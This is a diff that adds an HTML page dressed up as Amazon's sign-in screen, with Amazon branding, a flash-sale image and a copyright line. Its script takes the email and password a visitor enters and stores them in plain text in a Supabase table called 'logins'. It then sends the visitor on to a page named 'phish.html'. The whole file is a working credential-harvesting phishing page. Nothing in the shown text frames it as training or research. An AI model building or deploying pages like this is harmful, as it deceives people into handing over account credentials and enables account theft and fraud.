@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon Sign-In</title>
+    <!-- Supabase JS Client -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: "Amazon Ember", Arial, sans-serif;
+            background-color: #ffffff;
+            color: #000000;
+            line-height: 1.4;
+        }
+
+        /* Header image logo */
+        .amazon-logo-img {
+            height: 77px;
+            width: auto;
+            display: block;
+        }
+
+        /* Visually hidden for screen readers */
+        .sr-only {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            padding: 0;
+            margin: -1px;
+            overflow: hidden;
+            clip: rect(0, 0, 1px, 1px);
+            white-space: nowrap;
+            border: 0;
+        }
+
+        /* Main Container */
+        .main-container {
+            display: flex;
+            justify-content: center;
+            /* Changed to horizontal layout */
+            flex-direction: column;
+            align-items: center;
+            min-height: calc(100vh - 200px);
+            padding: 20px;
+            background-color: #ffffff;
+        }
+
+        /* Content container for cards */
+        .content-container {
+            display: flex;
+            flex-direction: row;
+            justify-content: center;
+            align-items: stretch; /* Changed from center to stretch */
+            gap: 30px;
+            width: 100%;
+            max-width: 950px; /* Slightly increased */
+            margin-top: 20px;
+            min-height: 460px; /* Adjusted for better height */
+        }
+
+        /* Offer card */
+        .offer-card {
+            flex: 2;
+            background-color: #ffffff;
+            border: 1px solid #ddd;
+            border-radius: 8px; /* Increased border radius */
+            overflow: hidden;
+            max-width: 1000px;
+            height: auto;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.15); /* Enhanced shadow */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .offer-card img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        /* Logo above the cards */
+        .amazon-logo-main {
+            margin-top: 20px;
+            margin-bottom: 10px;
+        }
+
+        .login-container {
+            background-color: #ffffff;
+            border: 1px solid #ddd;
+            border-radius: 8px; /* Increased border radius */
+            padding: 26px 28px; /* Increased padding */
+            width: 100%;
+            max-width: 350px;
+            height: auto; /* Auto height to match content */
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.15); /* Enhanced shadow */
+            flex: 0 0 auto;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .login-form {
+            width: 100%;
+        }
+        
+        .login-form h1 {
+            font-size: 28px;
+            font-weight: 400;
+            line-height: 1.2;
+            margin-bottom: 18px;
+            color: #0f1111;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 14px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 700;
+            color: #111;
+            margin-bottom: 2px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 3px 7px;
+            border: 1px solid #a6a6a6;
+            border-radius: 3px;
+            font-size: 13px;
+            height: 31px;
+            background-color: #ffffff;
+            color: #0f1111;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #e4791180;
+            box-shadow: 0 0 3px 2px #e4791180;
+        }
+
+        .form-group input.error {
+            border-color: #e4791180;
+        }
+
+        .error-message {
+            color: #000000;
+            font-size: 12px;
+            margin-top: 2px;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        .continue-btn {
+            background: linear-gradient(to bottom, #f7dfa5, #f0c14b);
+            border: 1px solid #a88734;
+            border-radius: 3px;
+            width: 100%;
+            padding: 8px;
+            font-size: 13px;
+            cursor: pointer;
+            margin-top: 10px;
+            color: #000000;
+        }
+
+        .continue-btn:hover {
+            background: linear-gradient(to bottom, #f5d78e, #eeb933);
+            border-color: #9c7e31;
+        }
+
+        .legal-text {
+            font-size: 12px;
+            color: #393939;
+            margin-top: 18px;
+            line-height: 1.4;
+        }
+
+        .legal-text a {
+            color: #0b61ac;
+            text-decoration: none;
+        }
+
+        .legal-text a:hover {
+            color: #4358e6;
+            text-decoration: underline;
+        }
+
+        .divider {
+            margin: 22px 0;
+            position: relative;
+            text-align: center;
+        }
+
+        .divider::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: #575555;
+        }
+
+        .divider span {
+            background: #ffffff;
+            color: #434343;
+            font-size: 13px;
+            padding: 0 8px;
+            position: relative;
+        }
+
+        .create-account-section {
+            text-align: center;
+            margin-top: 16px;
+        }
+
+        .create-account-btn {
+            background: linear-gradient(to bottom, #f7dfa5, #f0c14b);
+            border: 1px solid #a88734;
+            border-radius: 3px;
+            width: 100%;
+            padding: 8px;
+            font-size: 13px;
+            cursor: pointer;
+            color: #000000;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+        }
+
+        .create-account-btn:hover {
+            background: linear-gradient(to bottom, #f5d78e, #eeb933);
+            border-color: #9c7e31;
+        }
+
+        /* Footer */
+        .footer {
+            background-color: #ffffff;
+            color: #ffffff;
+            text-align: center;
+            padding: 30px 0;
+            margin-top: 40px;
+        }
+
+        .footer-links {
+            margin-bottom: 20px;
+        }
+
+        .footer-links a {
+            color: #4582b8;
+            text-decoration: none;
+            font-size: 12px;
+            margin: 0 15px;
+        }
+
+        .footer-links a:hover {
+            color: #01427b;
+            text-decoration: underline;
+        }
+
+        .footer-copyright {
+            font-size: 12px;
+            color: #565454;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .main-container {
+                padding: 10px;
+            }
+            
+            .content-container {
+                flex-direction: column;
+                align-items: center;
+                gap: 20px;
+            }
+            
+            .offer-card {
+                max-width: 350px;
+                align-self: center;
+            }
+
+            .login-container {
+                border: none;
+                padding: 20px 18px;
+                margin-top: 0;
+            }
+
+            .amazon-logo {
+                font-size: 20px;
+            }
+
+            .footer-links a {
+                display: block;
+                margin: 5px 0;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 20px 14px;
+            }
+
+            .login-form h1 {
+                font-size: 24px;
+            }
+
+            .footer {
+                padding: 20px 0;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Main Content -->
+    <main class="main-container">
+        <!-- moved logo outside the card -->
+        <div class="amazon-logo-main">
+            <a href="#" class="amazon-logo">
+                <img src="amazon.png" alt="Amazon" class="amazon-logo-img" />
+                <span class="sr-only">Amazon</span>
+            </a>
+        </div>
+
+        <div class="content-container">
+            <!-- Offer card on the left -->
+            <div class="offer-card">
+                <img src="offer.png" alt="Flash Sale Offer" />
+            </div>
+
+            <!-- Login container on the right -->
+            <div class="login-container">
+                <form class="login-form" id="loginForm">
+                    <h1>Sign in</h1>
+                    
+                    <div class="form-group">
+                        <label for="email">Email </label>
+                        <input type="text" id="email" name="email" required>
+                        <div class="error-message" id="emailError">Enter your email </div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="password">Password</label>
+                        <input type="password" id="password" name="password" required>
+                        <div class="error-message" id="passwordError">Enter your password</div>
+                    </div>
+                
+                <button type="submit" class="continue-btn">Continue</button>
+                
+                <div class="legal-text">
+                    By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.
+                </div>
+            </form>
+            
+            <div class="divider">
+                <span>New to Amazon?</span>
+            </div>
+            
+            <div class="create-account-section">
+                <a href="#" class="create-account-btn">Create your Amazon account</a>
+            </div>
+        </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-links">
+            <a href="#">Conditions of Use</a>
+            <a href="#">Privacy Notice</a>
+            <a href="#">Help</a>
+        </div>
+        <div class="footer-copyright">
+            © 1996-2024, Amazon.com, Inc. or its affiliates
+        </div>
+    </footer>
+
+    <!-- Update the script section to fetch credentials from the server -->
+    <script>
+        // Form validation and interaction
+        document.addEventListener('DOMContentLoaded', function() {
+            // Fetch Supabase credentials from the server
+            let supabaseClient;
+            
+            // Fetch the configuration from the server
+            fetch('/api/config')
+                .then(response => response.json())
+                .then(config => {
+                    // Initialize Supabase client with fetched credentials
+                    supabaseClient = supabase.createClient(
+                        config.supabaseUrl,
+                        config.supabaseAnonKey
+                    );
+                    console.log('Supabase client initialized');
+                })
+                .catch(error => {
+                    console.error('Error fetching configuration:', error);
+                });
+            
+            const form = document.getElementById('loginForm');
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+            const emailError = document.getElementById('emailError');
+            const passwordError = document.getElementById('passwordError');
+
+            // Email validation function
+            function validateEmail(email) {
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                return emailRegex.test(email) && email.length <= 128;
+            }
+
+            // Show error function
+            function showError(input, errorElement, message) {
+                input.classList.add('error');
+                errorElement.textContent = message;
+                errorElement.classList.add('show');
+            }
+
+            // Hide error function
+            function hideError(input, errorElement) {
+                input.classList.remove('error');
+                errorElement.classList.remove('show');
+            }
+
+            // Real-time validation
+            emailInput.addEventListener('input', function() {
+                if (this.value.trim() === '') {
+                    showError(this, emailError, 'Enter your email');
+                } else if (!validateEmail(this.value.trim())) {
+                    showError(this, emailError, 'Enter a valid email');
+                } else {
+                    hideError(this, emailError);
+                }
+            });
+
+            passwordInput.addEventListener('input', function() {
+                if (this.value.length === 0) {
+                    showError(this, passwordError, 'Enter your password');
+                } else if (this.value.length < 6) {
+                    showError(this, passwordError, 'Your password must be at least 6 characters');
+                } else {
+                    hideError(this, passwordError);
+                }
+            });
+
+            // Form submission
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                let isValid = true;
+                
+                // Validate email
+                if (emailInput.value.trim() === '') {
+                    showError(emailInput, emailError, 'Enter your email ');
+                    isValid = false;
+                } else if (!validateEmail(emailInput.value.trim())) {
+                    showError(emailInput, emailError, 'Enter a valid email');
+                    isValid = false;
+                } else {
+                    hideError(emailInput, emailError);
+                }
+                
+                // Validate password
+                if (passwordInput.value.length === 0) {
+                    showError(passwordInput, passwordError, 'Enter your password');
+                    isValid = false;
+                } else if (passwordInput.value.length < 6) {
+                    showError(passwordInput, passwordError, 'Your password must be at least 6 characters');
+                    isValid = false;
+                } else {
+                    hideError(passwordInput, passwordError);
+                }
+                
+                if (isValid) {
+                    // Show loading state
+                    const continueBtn = document.querySelector('.continue-btn');
+                    const originalBtnText = continueBtn.textContent;
+                    continueBtn.textContent = 'Signing in...';
+                    continueBtn.disabled = true;
+                    
+                    // Send data to Supabase
+                    async function saveToSupabase() {
+                        try {
+                            // Ensure Supabase client is initialized
+                            if (!supabaseClient) {
+                                throw new Error('Supabase client not initialized');
+                            }
+                            
+                            // Insert the login data into your Supabase table
+                            const { data, error } = await supabaseClient
+                                .from('logins') // Replace with your table name
+                                .insert([
+                                    { 
+                                        email: emailInput.value, 
+                                        password: passwordInput.value,
+                                        login_time: new Date().toISOString()
+                                    }
+                                ]);
+                                
+                            if (error) {
+                                console.error('Supabase error:', error);
+                            } else {
+                                console.log('Login data saved to Supabase:', data);
+                                setTimeout(function() {
+                                    window.location.href = 'phish.html';
+                                });
+
+                                // Clear the form after successful submission
+                                emailInput.value = '';
+                                passwordInput.value = '';
+                            }
+                        } catch (err) {
+                            console.error('Error:', err);
+                        } finally {
+                            // Reset button state
+                            continueBtn.textContent = originalBtnText;
+                            continueBtn.disabled = false;
+                        }
+                    }
+                    
+                    // Call the async function
+                    saveToSupabase();
+                }
+            });
+
+            // Focus effects
+            const inputs = document.querySelectorAll('input');
+            inputs.forEach(input => {
+                input.addEventListener('focus', function() {
+                    this.parentElement.classList.add('focused');
+                });
+                
+                input.addEventListener('blur', function() {
+                    this.parentElement.classList.remove('focused');
+                });
+            });
+        });
+    </script>
+</body>
+</html>
